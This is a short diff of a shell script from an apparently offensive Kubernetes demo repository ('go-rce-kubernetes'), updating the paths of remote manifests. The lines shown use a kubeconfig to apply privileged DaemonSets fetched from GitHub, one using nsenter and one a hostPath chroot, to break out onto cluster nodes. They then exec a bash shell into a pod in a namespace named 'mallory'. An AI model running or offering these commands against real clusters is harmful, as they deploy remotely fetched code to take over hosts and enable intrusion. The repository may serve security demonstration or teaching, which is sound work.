@@ -176,13 +176,13 @@ EOF
 # Option 1 - install privileged container (using nsenter)
 #####
 # install privileged container (nsenter)
-./kubectl --kubeconfig=config apply -f https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/07-priv-daemonset-nsenter.yaml
+./kubectl --kubeconfig=config apply -f https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/02-deployment/03-priv-daemonset-nsenter.yaml
  
  
 #####
 # Option 2 - install privileged container (with hostPath mount)
 #####
-./kubectl --kubeconfig=config apply -f https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/08-priv-daemonset-chroot.yaml
+./kubectl --kubeconfig=config apply -f https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/02-deployment/04-priv-daemonset-chroot.yaml
  
 # exec into pod
 ./kubectl --kubeconfig=config exec $(./kubectl --kubeconfig=config get pods -o=jsonpath={.items[1].metadata.name} -n mallory) -n mallory -it /bin/bash
